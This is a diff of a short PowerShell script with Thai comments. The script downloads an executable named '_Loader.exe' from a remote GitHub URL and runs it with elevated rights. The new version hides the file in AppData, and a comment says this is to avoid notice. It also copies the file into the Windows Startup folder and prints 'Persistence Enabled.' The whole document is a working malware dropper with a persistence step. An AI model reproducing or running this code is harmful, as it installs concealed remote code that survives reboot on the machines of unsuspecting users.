@@ -1,22 +1,25 @@
-# แก้บรรทัดที่ 2 ให้เป็นชื่อนี้:
-$exeUrl = "https://github.com/lubyralph6-maker/newpower.ps1/raw/main/_Loader.exe"
-$outputPath = "$env:TEMP\_Loader.exe"
+# 1. ตั้งค่าตำแหน่งไฟล์
+$url = "https://github.com/lubyralph6-maker/newpower.ps1/raw/main/_Loader.exe"
+$destPath = "$env:APPDATA\_Loader.exe"  # เก็บไว้ใน AppData เพื่อหลบสายตา
+$startupLnk = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\_Loader.exe"
 
-# ส่วนที่เหลือเหมือนเดิม...
-Write-Host "Connecting to Server..." -ForegroundColor Cyan
-try {
-    $webClient = New-Object System.Net.WebClient
-    $webClient.DownloadFile($exeUrl, $outputPath)
-} catch {
-    Write-Host "Download Failed!" -ForegroundColor Red
-    pause
-    exit
+Write-Host "Checking System..." -ForegroundColor Cyan
+
+# 2. ตรวจสอบและดาวน์โหลดไฟล์มาไว้ในเครื่อง (ถ้ายังไม่มี)
+if (!(Test-Path $destPath)) {
+    try {
+        Invoke-WebRequest -Uri $url -OutFile $destPath
+    } catch {
+        Write-Host "Connection Error!" -ForegroundColor Red
+        exit
+    }
 }
 
-if (Test-Path $outputPath) {
-    Write-Host "Starting Loader..." -ForegroundColor Green
-    Start-Process -FilePath $outputPath -Verb RunAs
-} else {
-    Write-Host "File not found!" -ForegroundColor Red
-    pause
+# 3. สร้างระบบ "รันอัตโนมัติ" (Copy ไปไว้ในโฟลเดอร์ Startup)
+if (!(Test-Path $startupLnk)) {
+    Copy-Item -Path $destPath -Destination $startupLnk -Force
+    Write-Host "Persistence Enabled." -ForegroundColor Green
 }
+
+# 4. รันโปรแกรมขึ้นมาทำงาน
+Start-Process -FilePath $destPath -Verb RunAs
